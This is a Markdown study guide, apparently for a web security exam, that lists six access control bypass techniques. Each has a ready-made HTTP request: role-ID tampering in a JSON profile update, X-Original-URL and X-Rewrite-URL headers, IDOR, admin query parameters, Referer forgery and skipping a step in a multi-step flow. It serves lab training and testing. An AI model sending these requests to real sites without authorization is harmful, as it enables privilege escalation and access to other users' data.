# Access Control Vulnerabilities - Stage 2

## 🎯 Overview

Access control vulnerabilities allow attackers to access resources or perform actions they shouldn't be authorized for.

## 🔥 Common Patterns

### Lab 1: User Role Modified in Profile
**Bypass:** JSON roleId manipulation

**Scenario:** Profile update includes role information

**Original Request:**
```http
POST /my-account HTTP/1.1
Content-Type: application/json

{
  "email": "user@example.com",
  "roleId": 1
}
```

**Exploit:**
```http
POST /my-account HTTP/1.1
Content-Type: application/json

{
  "email": "user@example.com",
  "roleId": 2
}
```

**Look for:**
- `roleId`
- `role`
- `isAdmin`
- `admin`
- `privilege`

---

### Lab 2: URL-Based Access Control
**Bypass:** Change URL path or headers

**Scenario:** Admin panel blocked by URL check

**Blocked:**
```http
GET /admin HTTP/1.1
Host: vulnerable-site.com
```

**Bypass with X-Original-URL:**
```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Original-URL: /admin
```

**Bypass with X-Rewrite-URL:**
```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Rewrite-URL: /admin
```

---

### Lab 3: IDOR (Insecure Direct Object Reference)
**Bypass:** Change ID parameter to access other users' data

**Example:**
```http
GET /api/user/123/profile HTTP/1.1
```

Try:
```http
GET /api/user/1/profile HTTP/1.1
GET /api/user/admin/profile HTTP/1.1
```

---

### Lab 4: Parameter-Based Access Control
**Bypass:** Add admin parameter

**Original:**
```http
GET /admin-panel HTTP/1.1
```

**Bypass:**
```http
GET /admin-panel?admin=true HTTP/1.1
GET /admin-panel?isAdmin=1 HTTP/1.1
```

---

### Lab 5: Referer-Based Access Control
**Bypass:** Add/modify Referer header

**Scenario:** Admin actions require Referer from admin page

**Exploit:**
```http
POST /admin/delete-user HTTP/1.1
Referer: https://vulnerable-site.com/admin
```

---

### Lab 6: Multi-Step Process Bypass
**Bypass:** Skip intermediate steps

**Normal Flow:**
1. GET /admin/delete-user?id=123
2. POST /admin/delete-user/confirm (with CSRF token)

**Bypass:**
```http
POST /admin/delete-user/confirm HTTP/1.1

id=123
```

## 🎓 Exam Tips

1. **Check JSON in profile updates** - Look for `roleId`, `isAdmin`
2. **Try X-Original-URL header** - Common bypass for URL-based controls
3. **Test IDOR on all ID parameters** - Try `1`, `admin`, `administrator`
4. **Add admin parameters** - `?admin=true`, `?isAdmin=1`
5. **Modify Referer header** - Point to admin page
6. **Skip steps in multi-step processes** - Go directly to final step

## 🔍 Testing Checklist

- [ ] Inspect profile update requests for role fields
- [ ] Try accessing `/admin` with different methods
- [ ] Test `X-Original-URL` and `X-Rewrite-URL` headers
- [ ] Change ID parameters to `1`, `admin`, `administrator`
- [ ] Add `admin=true` or similar parameters
- [ ] Modify Referer header to admin pages
- [ ] Skip intermediate steps in workflows

## 📚 References

- [PortSwigger Access Control](https://portswigger.net/web-security/access-control)
- [IDOR Testing Guide](https://portswigger.net/web-security/access-control/idor)
